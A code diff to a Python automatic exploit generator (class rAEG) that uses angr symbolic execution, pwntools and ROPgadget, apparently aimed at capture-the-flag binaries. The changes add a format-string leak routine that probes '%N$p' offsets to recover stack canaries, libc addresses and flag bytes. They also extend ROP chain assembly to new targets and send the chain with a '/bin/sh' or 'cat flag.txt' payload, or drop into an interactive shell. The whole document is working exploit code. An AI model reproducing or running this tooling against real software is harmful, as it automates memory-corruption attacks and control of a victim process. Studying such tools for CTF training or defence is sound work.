@@ -5,8 +5,9 @@ import argparse
 import ropgadget
 
 from pwn import *
+from binascii import *
 
-
+# Disable angr logging and pwntools until we need it 
 logging.getLogger("angr").setLevel(logging.CRITICAL)
 logging.getLogger("os").setLevel(logging.CRITICAL)
 logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
@@ -21,7 +22,7 @@ context.update(
     #terminal=["st"]
 )
 
-# Important lists to use
+# Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
 strings =  ["/bin/sh", "cat flag.txt", "flag.txt"]
 exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
 arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
@@ -30,6 +31,7 @@ useful_rop_functions = ["__libc_csu_init"]
 
 class rAEG:
 
+    # Initialize class variables that are important here
     def __init__(self, binary_path, libc_path):
         self.binary = binary_path
         self.elf = context.binary =  ELF(binary_path)
@@ -48,8 +50,6 @@ class rAEG:
         self.canary_leak = None
 
         self.flag = None
-        
-       
 
     # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
     def check_mem_corruption(self, simgr):
@@ -77,9 +77,11 @@ class rAEG:
         self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
         start_addr = self.elf.sym["main"]
         # Maybe change to symbolic file stream
-        buff_size = 600
+        buff_size = 613
         self.symbolic_input = claripy.BVS("input", 8 * buff_size)
         self.symbolic_padding = None
+
+        cfg = self.proj.analyses.CFGFast()
 
         self.state = self.proj.factory.blank_state(
                 addr=start_addr,
@@ -88,8 +90,9 @@ class rAEG:
         self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
         self.simgr.stashes["mem_corrupt"] = []
 
-
-        self.printf_leak_address = None
+        # This is the address after the last printf is called which is where we want to check the got table 
+        # to see which functions are unfilled
+        self.last_printf_address = None
 
 
         # Check to see if printf is a format string vulnerability
@@ -101,6 +104,7 @@ class rAEG:
             address = state.solver.eval(state.regs.rip)
 
             if varg <= 0xff:
+                self.last_printf_address = hex(state.callstack.current_return_target)
                 print(hex(state.callstack.current_return_target))
 
         self.proj.hook_symbol("printf", analyze_printf)
@@ -139,6 +143,7 @@ class rAEG:
             # Check if fopen symbol
 
         #else:
+        self.format_leak()
         self.angry_stack_smash()
 
 
@@ -178,6 +183,11 @@ class rAEG:
                 log.info("Found syscall function")
                 params = [self.string_address, p64(0), p64(0)]
                 break
+            elif symb == "print_file":
+                self.exploit_function = "print_file"
+                log.info("Found print_file function")
+                params = [self.string_address]
+                break
 
         # Set functions and parameters as a dictionary set
 
@@ -186,8 +196,9 @@ class rAEG:
 
         return None
 
-    # Find gadget to control register
+    # Find pop gadgets to control register
     def find_pop_reg_gadget(self, register):
+        # Filters out only pop instructions 
         output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"{register}", "--only", "pop|ret"]).split(b"\n")
         output.pop(0)
         output.pop(0)
@@ -200,6 +211,7 @@ class rAEG:
             log.info(f"Couldn't find gadget for {register}")
             return None
         # Iterate through gadgets to find the one with the least instructions
+        # This will make sure that the gadget that we want is always first
         min_gadget = output[0]
         min_instructions = output[0].count(b";") + 1
         for gadget in output:
@@ -225,6 +237,7 @@ class rAEG:
         # First get check to make sure that the same register isn't being dereferenced
         # Add all gadgets that are valid to a list
         # Optimal gadgets will have both registers using 64 bit for the mov write primitive
+        # Valid gadgets will be one where the two registers are different
         valid_gadgets = []
         optimal_gadgets = []
         for gadget in output:
@@ -240,7 +253,7 @@ class rAEG:
                                 optimal_gadgets.append(gadget)
 
 
-        # If there are no optimal gadgets choose from valid ones``
+        # If there are no optimal gadgets choose from valid ones
         if len(optimal_gadgets) <= 0:
             if len(valid_gadgets) <= 0:
                 log.warning("Couldn't find write gadget")
@@ -260,7 +273,6 @@ class rAEG:
 
         reg1 = min_gadget.split(b"[")[1].split(b",")[0].split(b"]")[0].strip()
         reg2 = min_gadget.split(b"[")[1].split(b",")[1].split(b"]")[0].split(b";")[0].strip()
-        print(reg1, reg2)
         return min_gadget, reg1, reg2
 
     # Find writable address in binary
@@ -321,14 +333,15 @@ class rAEG:
                     chain += param
 
             # Reversed in order as the more important parameters go in last
-            for i in range(len(parameters)-1, -1, -1):
+            #for i in range(len(parameters)-1, -1, -1):
+            for i in range(len(parameters)):
                 pop_reg_string = self.find_pop_reg_gadget(arg_regs[i].decode())
                 if pop_reg_string == None:
                     continue
                 instructions = pop_reg_string.split(b";")
                 pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
                 chain += pop_reg
-                print(parameters)
+                #print(parameters)
                 chain += parameters[i]
                 for instruction in instructions[1:]:
                     if b"ret" in instruction:
@@ -341,7 +354,7 @@ class rAEG:
                             break;
                     chain += param
 
-        # To avoid movaps error for ret2win put an extra ret
+        # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
         if (len(chain) + self.chain_length + 8) % 16 != 0:
             chain += p64(self.elf.sym["_fini"])
         if function == "syscall":
@@ -366,8 +379,7 @@ class rAEG:
     def generate_rop_chain(self):
 
         if self.string_address == None:
-            #Perform a string write
-            #
+            #Perform a write primitive
             self.rop_chain = self.rop_chain_write_string()
             self.chain_length += len(self.rop_chain)
             self.string_address = p64(self.elf.get_section_by_name(".data").header.sh_addr)
@@ -378,7 +390,67 @@ class rAEG:
 
         return None
 
+    def format_leak(self):
+        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
+        control = 0
+        start_end = [0,0]
+        stack_len = 300
+        string = ""
+
+        for  i in range(1, stack_len):
+
+            if control == 1:
+                break
+
+            p = process(self.binary)
+            offset_str = "%" + str(i) + "$p."
+            p.sendline(bytes(offset_str, "utf-8"))
+            p.recvuntil(b">>>")
+
+            try:
+                p.recvuntil(b": ")
+                response = p.recvline().strip().split(b".")
+
+
+                if response[0].decode() != "(nil)":
+                    address = response[0].decode()
+                    response = response[0].strip(b"0x")
+
+                    canary = re.search(r"0x[a-f0-9]{14}00", address)
+                    if canary and self.elf.canary:
+                        self.canary_offset_string = offset_str
+                        logging.getLogger("pwnlib").setLevel(logging.INFO)
+                        log.info(f"Found canary leak at offset {i}:{address}")
+                        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+
+                    libc_leak = re.search(r"0x7f[a-f0-9]{8}4a", address)
+                    if libc_leak:
+                        self.libc_offset_string = offset_str
+                        logging.getLogger("pwnlib").setLevel(logging.INFO)
+                        log.info(f"Found libc leak at offset {i}:{address}")
+                        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+
+                    try:
+                        flag = unhexlify(response)[::-1]
+                        if "flag" in flag.decode() and start_end[0] == 0:
+                            string += flag.decode()
+                            start_end[0] = 1
+                        elif start_end[0] == 1 and "}" in flag.decode():
+                            string += flag.decode()
+                            self.flags.append(string)
+                        elif start_end[0] == 1 and "}" not in flag.decode():
+                            string += flag.decode()
+                        elif "}" in flag.decode() and start_end[1] == 0:
+                            string += flag.decode()
+                            self.flags.append(string)
+                            control = 1
+                    except:
+                        log.info("RIP")
+
+            except:
+                log.info("BOZO")
+        logging.getLogger("pwnlib").setLevel(logging.INFO)
 
 
     def start_process(self, mode):
@@ -415,17 +487,23 @@ class rAEG:
                 log.info("Sending ROP Chain")
                 p.sendline(self.symbolic_padding + self.rop_chain)
                 p.sendline(b"cat flag.txt")
+                try:
+                    output = p.recvuntil(b"}").decode().split("\n")[-1]
+                    self.flag = output
+                    print(output)
+                except:
+                    log.info("ROP chain exploit failed")
+
             else:
                 main = p64(self.elf.sym["main"])
                 fini = p64(self.elf.sym["_fini"])
                 p.sendline(self.symbolic_padding + fini +  main)
-            p.interactive()
+                p.interactive()
         # Assume that its a format challenge either format write or format leak
         else:
             # Insert leak stack function here
             p.sendline("%p")
             p.interactive()
-        
 
 if __name__ == "__main__":
 
